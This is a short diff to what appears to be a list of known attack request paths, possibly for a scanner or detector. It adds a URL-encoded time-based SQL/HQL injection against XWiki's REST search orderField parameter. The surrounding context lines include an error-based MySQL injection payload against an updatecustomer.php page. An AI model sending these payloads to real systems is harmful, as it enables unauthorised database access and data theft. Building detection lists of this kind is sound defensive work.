@@ -185,3 +185,4 @@
 /api/v1/components?name=1&1%5B0%5D=&1%5B1%5D=a&1%5B2%5D=&1%5B3%5D=or+
 /mims/updatecustomer.php?customer_number=-1%27%20and%206%3d3%20or%201%3d1%2b(SELECT%201%20and%20ROW(1%2c1)%3e(SELECT%20COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.COLLATIONS%20GROUP%20BY%20x)a)%2b%27
 /College-Management-System/admin/asign-single-student-subjects.php
+/xwiki/rest/wikis/xwiki/search?q=test&scope=title&orderField=doc.fullName%20from%20XWikiDocument%20as%20doc%20where%20%24%24%3D%27%24%24%3Dconcat(chr(61)%2Cchr(39))%20and%20version()%7C%7Cpg_sleep(1)%3Dversion()%7C%7Cpg_sleep(1)%20and%20(1%3D1%20or%20%3F%3D%3F%20or%20%3F%3D%3F%20or%20%3F%3D%3F%20or%20%3F%3D%3F%20or%20%3F%3D%3F)%20--%20comment%27%20or%20a%3D%27%20order%20by%20doc.fullName
